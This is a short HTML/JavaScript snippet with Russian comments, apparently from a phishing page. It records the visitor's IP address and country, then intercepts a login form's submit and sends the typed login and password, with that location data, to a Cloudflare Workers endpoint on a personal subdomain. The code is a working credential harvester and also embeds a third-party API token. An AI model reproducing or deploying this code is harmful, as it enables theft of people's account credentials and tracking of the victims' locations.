<script>
  const WORKER_URL = 'https://mute-scene-f7f5.kamrantataloo69.workers.dev/';
  let clientIp = 'unknown', clientCountry = 'unknown';

  // 1) Получаем публичный IPv4
  fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(json => {
      clientIp = json.ip;
      document.getElementById('ip').textContent = clientIp;

      // 2) Запрашиваем страну по IP
      return fetch(`https://ipinfo.io/${clientIp}/json?token=12e7da7cd87750`);
    })
    .then(r => r.json())
    .then(info => {
      clientCountry = info.country;                        // сохраняем
      document.getElementById('country').textContent = clientCountry;
      document.getElementById('flag').src =
        `https://flagcdn.com/w80/${clientCountry.toLowerCase()}.png`;
    })
    .catch(err => {
      console.warn('IP/Country fetch failed', err);
      document.getElementById('country').textContent = '—';
    });

  // 3) Отправляем форму
  document.getElementById('loginForm').addEventListener('submit', async e => {
    e.preventDefault();
    const form = e.target;

    const postData = {
      ip: clientIp,
      country: clientCountry,   // теперь отправляем country
      login: form.login.value,
      password: form.password.value
    };

    const resp = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(postData)
    });

    if (resp.ok) alert('Данные отправлены!');
    else      alert('Ошибка отправки');
  });
</script>
